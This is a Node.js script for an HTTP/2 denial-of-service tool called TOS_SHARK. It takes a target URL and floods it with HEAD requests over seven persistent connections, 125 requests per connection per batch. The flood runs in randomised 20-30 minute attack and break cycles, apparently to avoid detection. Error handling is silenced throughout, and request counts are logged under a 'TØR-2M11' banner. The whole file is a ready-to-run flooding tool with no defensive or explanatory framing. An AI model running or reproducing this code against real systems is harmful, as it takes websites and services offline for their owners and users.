const http2 = require('http2');
const https = require('https');
const { URL } = require('url');

class TOS_SHARK {
    constructor(target) {
        const url = new URL(target);
        this.host = url.hostname;
        this.isHttps = url.protocol === 'https:';
        this.target = target;
        
        this.running = true;
        this.attackActive = false;
        this.totalReqs = 0;
        this.startTime = Date.now();
        this.lastLog = Date.now();
        this.reqCounter = 0;
        this.attackStart = 0;
        this.breakStart = 0;
        
        // Data pools
        this.userAgents = [
            'Mozilla/5.0',
            'Chrome/120.0.0.0',
            'Safari/537.36'
        ];
        
        // Connections
        this.connections = [];
        this.maxConnections = 7;
        this.requestsPerConnection = 125;
        
        // Color codes
        this.colors = {
            reset: '\x1b[0m',
            darkMagenta: '\x1b[35m',
            darkGreen: '\x1b[32m',
            red: '\x1b[91m',
            green: '\x1b[92m',
            yellow: '\x1b[93m'
        };
        
        // No GC, no memory-intensive objects
        this.start();
    }

    async start() {
        this.createConnections();
        this.mainLoop();
    }

    createConnections() {
        for (let i = 0; i < this.maxConnections; i++) {
            try {
                const client = http2.connect(this.target, {
                    maxSessionMemory: 1024 * 1024, // 1MB max memory per session
                    maxDeflateDynamicTableSize: 4096,
                    maxHeaderListPairs: 128,
                    maxOutstandingPings: 2,
                    maxSendHeaderBlockLength: 16384
                });
                
                // Minimal error handling
                client.on('error', (e) => {});
                client.on('goaway', () => {});
                client.on('frameError', () => {});
                
                this.connections.push({
                    client: client,
                    healthy: true
                });
            } catch (err) {}
        }
    }

    async mainLoop() {
        let batchCounter = 0;
        
        while (this.running) {
            const now = Date.now();
            
            // Simple attack/break cycle (no complex timing objects)
            if (this.attackActive) {
                // Attack for 20-30 minutes
                if (!this.attackStart) this.attackStart = now;
                if (now - this.attackStart >= (20 + Math.random() * 10) * 60000) {
                    this.attackActive = false;
                    this.attackStart = 0;
                    this.breakStart = now;
                    this.cleanupConnections();
                    continue;
                }
                
                // Send requests in controlled batches
                if (batchCounter % 10 === 0) {
                    await this.sendBatch();
                }
                batchCounter++;
                
            } else {
                // Break for 20-30 minutes
                if (!this.breakStart) this.breakStart = now;
                if (now - this.breakStart >= (20 + Math.random() * 10) * 60000) {
                    this.attackActive = true;
                    this.breakStart = 0;
                    this.createConnections();
                    continue;
                }
                
                // Minimal sleep during break
                await this.sleep(100);
            }
            
            // Small delay between loops (prevents event loop congestion)
            if (batchCounter % 100 === 0) {
                await this.sleep(1);
            }
        }
    }

    async sendBatch() {
        // Use setTimeout for non-blocking async
        return new Promise((resolve) => {
            setTimeout(() => {
                let sent = 0;
                
                for (const conn of this.connections) {
                    if (conn.healthy && conn.client && !conn.client.destroyed) {
                        // Send 125 requests per connection
                        for (let i = 0; i < this.requestsPerConnection; i++) {
                            this.sendHeadRequest(conn.client);
                            this.totalReqs++;
                            this.reqCounter++;
                            sent++;
                            
                            // Spread out requests slightly
                            if (i % 25 === 0) {
                                // Yield to event loop
                                setImmediate(() => {});
                            }
                        }
                    }
                }
                
                // Log every 10 seconds
                if (Date.now() - this.lastLog >= 10000) {
                    this.lastLog = Date.now();
                    this.logStatus(200); // Default status for batch
                }
                
                resolve();
            }, 0); // Non-blocking
        });
    }

    sendHeadRequest(client) {
        // Minimal request creation
        try {
            const req = client.request({
                ':method': 'HEAD',
                ':path': '/',
                ':authority': this.host
            }, {
                endStream: true
            });
            
            // Minimal response handler
            req.on('response', (headers) => {
                const status = headers[':status'];
                // Store last status for logging
                this.lastStatus = status;
                req.close();
            });
            
            req.on('error', () => {
                req.close();
            });
            
            req.end();
        } catch (err) {
            // Ignore errors
        }
    }

    cleanupConnections() {
        // Clean up without creating garbage
        for (const conn of this.connections) {
            try {
                if (conn.client && !conn.client.destroyed) {
                    conn.client.close();
                }
            } catch (e) {}
        }
        this.connections.length = 0; // Clear array without new allocation
    }

    logStatus(status) {
        // Format: TØR-2M11 = darkMagenta, totalReqs = darkGreen
        const prefix = `${this.colors.darkMagenta}TØR-2M11${this.colors.reset}:${this.colors.darkGreen}${this.totalReqs}${this.colors.reset} ---> `;
        
        // Status code color logic
        let statusColor = this.colors.green;
        let statusText = status === '*.*' ? '*.*' : (this.lastStatus || 200);
        
        if (statusText === '*.*') {
            statusColor = this.colors.red;
        } else if (typeof statusText === 'number') {
            if (statusText >= 500) {
                statusColor = this.colors.red;
            } else if (statusText >= 400) {
                statusColor = this.colors.red;
            } else if (statusText >= 300) {
                statusColor = this.colors.yellow;
            } else if (statusText >= 200) {
                statusColor = this.colors.green;
            }
        }
        
        console.log(prefix + `${statusColor}${statusText}${this.colors.reset}`);
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// Run with increased memory limit and no GC
if (require.main === module) {
    // Increase heap memory
    require('v8').setFlagsFromString('--max-old-space-size=4096');
    
    // Disable verbose errors
    process.removeAllListeners('uncaughtException');
    process.removeAllListeners('unhandledRejection');
    
    // Minimal error handling
    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});
    
    if (process.argv.length < 3) {
        process.exit(1);
    }
    
    new TOS_SHARK(process.argv[2]);
    
    process.on('SIGINT', () => {
        process.exit(0);
    });
}
